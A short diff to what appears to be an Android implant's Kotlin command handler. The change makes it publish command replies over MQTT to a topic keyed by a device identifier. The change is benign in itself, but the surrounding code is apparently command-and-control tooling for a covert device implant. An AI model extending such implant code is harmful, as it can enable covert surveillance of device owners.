@@ -2,6 +2,7 @@ package com.cooperthecoder.implant.command
 
 import android.content.Context
 import android.util.Log
+import com.cooperthecoder.implant.data.DeviceProperties
 import com.cooperthecoder.implant.data.SharedPreferencesQuery
 import com.cooperthecoder.implant.data.UploadQueue
 import org.eclipse.paho.android.service.MqttAndroidClient
@@ -110,6 +111,6 @@ class CommandHandler(context: Context, val command: Command, val client: MqttAnd
 
         val message = MqttMessage()
         message.payload = command.json().toByteArray()
-        client.publish(client.clientId, message)
+        client.publish(DeviceProperties.identifier(context), message)
     }
 }
